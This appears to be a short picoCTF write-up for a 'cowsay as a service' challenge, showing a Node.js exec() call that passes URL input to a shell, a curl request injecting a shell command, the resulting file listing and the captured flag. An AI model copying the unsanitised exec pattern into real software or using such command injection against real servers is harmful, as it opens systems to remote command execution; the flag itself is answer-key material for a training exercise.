# Solution

From the downloaded `index.js` file. We see that the user input is passed into a child process and executed.

```js
// Append user string to an executable command
exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    // Redirect output from stdout to screen
    res.type('txt').send(stdout).end();
});
```

The output from /usr/games/cowsay is displayed to our screen. Let's check which directory we're in.

```bash
$ curl 'https://caas.mars.picoctf.net/cowsay/echo%20$PWD'

< echo /app >
 -----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

Print out the list of files in our current location
```
 _________
< cd /app >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

Print out flag
```
 _________
< cd /app >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```